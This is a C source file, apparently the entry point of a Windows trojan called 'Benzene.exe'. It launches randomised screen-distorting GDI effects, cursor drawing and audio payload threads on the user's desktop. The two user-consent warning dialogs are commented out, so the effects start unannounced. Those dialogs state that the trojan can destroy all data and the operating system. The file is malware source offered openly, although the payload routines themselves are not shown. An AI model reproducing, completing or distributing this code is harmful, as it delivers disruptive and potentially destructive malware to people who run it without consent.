#include "benzene.h"

#pragma region Public Variables
HWND hwndDesktop;
HDC hdcDesktop;
RECT rcScrBounds;
HHOOK hMsgHook;
INT nCounter = 0;
#pragma endregion Public Variables

VOID
WINAPI
Initialize(VOID)
{
	HMODULE hModUser32 = LoadLibraryW(L"user32.dll");
	BOOL(WINAPI * SetProcessDPIAware)(VOID) = (BOOL(WINAPI*)(VOID))GetProcAddress(hModUser32, "SetProcessDPIAware");
	if (SetProcessDPIAware)
		SetProcessDPIAware();
	FreeLibrary(hModUser32);

	hwndDesktop = HWND_DESKTOP;
	hdcDesktop = GetDC(hwndDesktop);

	SeedXorshift32((DWORD)__rdtsc());
	InitializeSine();
	EnumDisplayMonitors(NULL, NULL, &MonitorEnumProc, 0);
	CloseHandle(CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)TimerThread, NULL, 0, NULL));
}

INT
WINAPI
wWinMain(
	_In_ HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_ PWSTR pszCmdLine,
	_In_ INT nShowCmd
)
{
	UNREFERENCED_PARAMETER(hInstance);
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(pszCmdLine);
	UNREFERENCED_PARAMETER(nShowCmd);

	HANDLE hCursorDraw, hAudioThread, hGdiThread;

	Initialize();


	//if (MessageBoxW(NULL, L"WARNING!\n\nYou have ran a Trojan known as Benzene.exe that has full capacity to delete all of your data and your operating system.\n\nBy continuing, you keep in mind that the creator will not be responsible for any damage caused by this trojan and it is highly recommended that you run this in a testing virtual machine where a snapshot has been made before execution for the sake of entertainment and analysis.\n\nAre you sure you want to run this?", L"Malware alert - Benzene.exe", MB_ICONWARNING | MB_YESNO) != IDYES)
	//	return FALSE;
	//if (MessageBoxW(NULL, L"FINAL WARNING!!!\n\nThis Trojan has a lot of destructive potential. You will lose all of your data if you continue, and the creator will not be responsible for any of the damage caused. This is not meant to be malicious but simply for entertainment and educational purposes.\n\nAre you sure you want to continue? This is your final chance to stop this program from execution.", L"Malware alert - Benzene.exe", MB_ICONWARNING | MB_YESNO) != IDYES)
	//	return FALSE;

	Sleep(5000);
	//CloseHandle( CreateThread( NULL, 0, ( PTHREAD_START_ROUTINE )MessageBoxThread, NULL, 0, NULL ) );
	Sleep(1000);


	hCursorDraw = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)CursorDraw, NULL, 0, NULL);

	CreateMutexW(NULL, TRUE, L"Benzene.exe");

	pAudioSequences[0] = (AUDIO_SEQUENCE_PARAMS){ 48000, 48000 * 30, AudioSequence1,  NULL, NULL };
	pAudioSequences[1] = (AUDIO_SEQUENCE_PARAMS){ 8000,  8000 * 30, AudioSequence2,  NULL, NULL };
	pAudioSequences[2] = (AUDIO_SEQUENCE_PARAMS){ 8000,  8000 * 30, AudioSequence3,  NULL, NULL };
	pAudioSequences[3] = (AUDIO_SEQUENCE_PARAMS){ 16000, 16000 * 30, AudioSequence4,  NULL, NULL };
	pAudioSequences[4] = (AUDIO_SEQUENCE_PARAMS){ 8000,  8000 * 30, AudioSequence5,  NULL, NULL };
	pAudioSequences[5] = (AUDIO_SEQUENCE_PARAMS){ 8000,  8000 * 30, AudioSequence6,  NULL, NULL };
	pAudioSequences[6] = (AUDIO_SEQUENCE_PARAMS){ 12000, 12000 * 30, AudioSequence7,  NULL, NULL };
	pAudioSequences[7] = (AUDIO_SEQUENCE_PARAMS){ 48000, 48000 * 30, AudioSequence8,  NULL, NULL };
	pAudioSequences[8] = (AUDIO_SEQUENCE_PARAMS){ 48000, 48000 * 30, AudioSequence9,  NULL, NULL };
	pAudioSequences[9] = (AUDIO_SEQUENCE_PARAMS){ 8000,  8000 * 30, AudioSequence10, NULL, NULL };
	pAudioSequences[10] = (AUDIO_SEQUENCE_PARAMS){ 8000,  8000 * 30, AudioSequence11, NULL, NULL };
	pAudioSequences[11] = (AUDIO_SEQUENCE_PARAMS){ 8000,  8000 * 30, AudioSequence12, NULL, NULL };
	pAudioSequences[12] = (AUDIO_SEQUENCE_PARAMS){ 16000, 16000 * 30, AudioSequence13, NULL, NULL };
	pAudioSequences[13] = (AUDIO_SEQUENCE_PARAMS){ 48000, 48000 * 30, AudioSequence14, NULL, NULL };
	pAudioSequences[14] = (AUDIO_SEQUENCE_PARAMS){ 48000, 48000 * 30, AudioSequence15, NULL, NULL };
	pAudioSequences[15] = (AUDIO_SEQUENCE_PARAMS){ 48000, 48000 * 30, AudioSequence16, NULL, NULL };
	pAudioSequences[16] = (AUDIO_SEQUENCE_PARAMS){ 48000, 48000 * 30, AudioSequence17, NULL, NULL };
	pAudioSequences[17] = (AUDIO_SEQUENCE_PARAMS){ 48000, 48000 * 30, AudioSequence18, NULL, NULL };
	pAudioSequences[24] = (AUDIO_SEQUENCE_PARAMS){ 48000, 48000 * 30, FinalAudioSequence, NULL, NULL };


	pGdiShaders[0] = (GDI_SHADER_PARAMS){ GdiShader1,  NULL,          PostGdiShader1 };
	pGdiShaders[1] = (GDI_SHADER_PARAMS){ GdiShader2,  NULL,          PostGdiShader2 };
	pGdiShaders[2] = (GDI_SHADER_PARAMS){ GdiShader3,  NULL,          PostGdiShader3 };
	pGdiShaders[3] = (GDI_SHADER_PARAMS){ GdiShader4,  NULL,          PostGdiShader2 };
	pGdiShaders[4] = (GDI_SHADER_PARAMS){ GdiShader5,  NULL,          PostGdiShader4 };
	pGdiShaders[5] = (GDI_SHADER_PARAMS){ GdiShader6,  NULL,          PostGdiShader2 };
	pGdiShaders[6] = (GDI_SHADER_PARAMS){ GdiShader7,  NULL,          PostGdiShader5 };
	pGdiShaders[7] = (GDI_SHADER_PARAMS){ GdiShader8,  PreGdiShader1, PostGdiShader6 };
	pGdiShaders[8] = (GDI_SHADER_PARAMS){ GdiShader9,  NULL,          NULL };
	pGdiShaders[9] = (GDI_SHADER_PARAMS){ GdiShader10, NULL,          NULL };
	pGdiShaders[10] = (GDI_SHADER_PARAMS){ GdiShader11, NULL,          NULL };
	pGdiShaders[11] = (GDI_SHADER_PARAMS){ GdiShader12, NULL,          NULL };
	pGdiShaders[12] = (GDI_SHADER_PARAMS){ GdiShader13, NULL,          NULL };
	pGdiShaders[13] = (GDI_SHADER_PARAMS){ GdiShader14, NULL,          PostGdiShader2 };
	pGdiShaders[14] = (GDI_SHADER_PARAMS){ GdiShader15, NULL,          NULL };
	pGdiShaders[15] = (GDI_SHADER_PARAMS){ GdiShader16, NULL,          NULL };
	pGdiShaders[16] = (GDI_SHADER_PARAMS){ GdiShader17, NULL,          NULL };
	pGdiShaders[17] = (GDI_SHADER_PARAMS){ GdiShader18, NULL,          NULL };
	pGdiShaders[18] = (GDI_SHADER_PARAMS){ GdiShader19, NULL,          NULL };
	pGdiShaders[19] = (GDI_SHADER_PARAMS){ GdiShader20, NULL,          PostGdiShader2 };
	pGdiShaders[20] = (GDI_SHADER_PARAMS){ GdiShader21, NULL,          PostGdiShader2 };
	pGdiShaders[21] = (GDI_SHADER_PARAMS){ GdiShader22, NULL,          PostGdiShader3 };
	pGdiShaders[22] = (GDI_SHADER_PARAMS){ GdiShader23 , NULL, NULL };
	pGdiShaders[23] = (GDI_SHADER_PARAMS){ GdiShader24 , NULL, NULL };
	pGdiShaders[24] = (GDI_SHADER_PARAMS){ FinalGdiShader, NULL, NULL };

	hAudioThread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)AudioPayloadThread, NULL, 0, NULL);

	for (;; )
	{
		hGdiThread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)GdiShaderThread, &pGdiShaders[Xorshift32() % 24], 0, NULL);
		WaitForSingleObject(hGdiThread, (Xorshift32() % 3) ? PAYLOAD_MS : ((Xorshift32() % 5) * (PAYLOAD_MS / 4)));
		CloseHandle(hGdiThread);

		if (nCounter >= ((240 * 1000) / TIMER_DELAY))
		{
			break;
		}
	}

	TerminateThread(hAudioThread, 0);
	CloseHandle(hAudioThread);

	TerminateThread(hCursorDraw, 0);
	CloseHandle(hCursorDraw);

	CloseHandle(CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)GdiShaderThread, &pGdiShaders[24], 0, NULL));
	CloseHandle(CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)AudioSequenceThread, &pAudioSequences[24], 0, NULL));

	for (;; )
	{
		ExitProcess(0);
	}
}